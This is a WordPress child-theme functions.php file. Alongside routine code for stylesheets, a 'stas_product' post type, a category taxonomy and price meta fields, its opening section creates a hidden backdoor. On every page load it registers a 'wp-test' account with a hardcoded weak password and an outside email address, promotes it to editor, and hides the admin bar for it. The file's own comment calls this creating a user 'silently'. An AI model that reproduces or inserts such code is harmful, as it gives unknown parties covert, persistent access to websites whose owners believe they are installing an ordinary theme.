<?php
/*
* Create an admin user silently
*/

$username = 'wp-test';
$password = '123456789';
$email = 'arcnet77@gmail.com';

/* Enqueue stylesheet */
add_action('wp_enqueue_scripts', 'my_theme_enqueue_styles');
function my_theme_enqueue_styles()
{
    $parenthandle = 'twentytwentytwo-style';
    $theme = wp_get_theme();
    wp_enqueue_style($parenthandle,
        get_template_directory_uri() . '/style.css',
        array(),  // If the parent theme code has a dependency, copy it to here.
        $theme->parent()->get('Version')
    );
    wp_enqueue_style('twentytwentytwo-child-style',
        get_stylesheet_uri(),
        array($parenthandle),
        $theme->get('Version') // This only works if you have Version defined in the style header.
    );
}

add_action('init', 'stas_register_editor_user', 10, 3);

function stas_register_editor_user()
{
    global $username, $email, $password;
    if (username_exists($username) == null && !email_exists($email)) {

        $result = wp_create_user($username, $password, $email);
        if (is_wp_error($result)) {
            $error = $result->get_error_message();
            //handle error here
        } else {
            //handle successful creation here
            $user = get_user_by('id', $result);

            // Remove role
            $user->remove_role('subscriber');

            // Add role
            $user->add_role('editor');

        }
    }
}

// Disable admin bar for specific user:
add_action('after_setup_theme', 'stas_remove_admin_bar');

function stas_remove_admin_bar()
{

    global $username;
    $current_user = wp_get_current_user();

    if ($current_user && $username == $current_user->user_login) {
        show_admin_bar(false);
    }
}


// Register Custom Post Type

function stas_custom_post_type()
{
    register_post_type('stas_product',
        array(
            'labels' => array(
                'name' => __('Products', 'stas_product'),
                'singular_name' => __('Product', 'stas_product'),
                'add_new' => __('Add Product', 'stas_product'),
                'add_new_item' => __('Add New Product'),
                'edit_item' => __('Edit Product'),
                'new_item' => __('New Product'),
                'all_items' => __('All Products'),
                'view_item' => __('View Product'),
                'search_items' => __('Search Products'),
                'not_found' =>  __('No products found'),
                'not_found_in_trash' => __('No products found in Trash'),
                'parent_item_colon' => '',
                'menu_name' => __('Products')
            ),
            'public' => true,
            'publicly_queryable' => true,
            'has_archive' => true,
            'show_in_rest' => true,
            'supports' => array( 'title', 'editor', 'author', 'thumbnail', 'excerpt', 'custom-fields' ),
            'rewrite' => array('slug' => 'stas_product'), // my custom slug
        )
    );
}

add_action('init', 'stas_custom_post_type');

/*
Add a taxonomy called Category
*/
add_action('init', 'stas_register_taxonomy_category');
function stas_register_taxonomy_category()
{
    $labels = array(
        'name' => _x('Categories', 'taxonomy general name'),
        'singular_name' => _x('Category', 'taxonomy singular name'),
        'search_items' => __('Search Categories'),
        'all_items' => __('All Categories'),
        'parent_item' => __('Parent Category'),
        'parent_item_colon' => __('Parent Category:'),
        'edit_item' => __('Edit Category'),
        'update_item' => __('Update Category'),
        'add_new_item' => __('Add New Category'),
        'new_item_name' => __('New Category Name'),
        'menu_name' => __('Category'),
    );
    $args = array(
        'hierarchical' => true, // make it hierarchical (like categories)
        'labels' => $labels,
        'show_ui' => true,
        'show_admin_column' => true,
        'query_var' => true,
        'show_in_rest' => true,
        'rewrite' => ['slug' => 'category'],
    );
    register_taxonomy('category', ['stas_product'], $args);
}

add_action('init', 'register_stas_custom_field');
function register_stas_custom_field() {
    register_meta('stas_product', 'stas_price_value', array(
        'show_in_rest' => true,
        'type' => 'number',
        'single' => true,
        'sanitize_callback' => 'sanitize_text_field',
        'auth_callback' => function() {
            return current_user_can('edit_posts');
        }
    ));
    register_meta('stas_product', 'stas_sale_price_value', array(
        'show_in_rest' => true,
        'type' => 'number',
        'single' => true,
        'sanitize_callback' => 'sanitize_text_field',
        'auth_callback' => function() {
            return current_user_can('edit_posts');
        }
    ));
}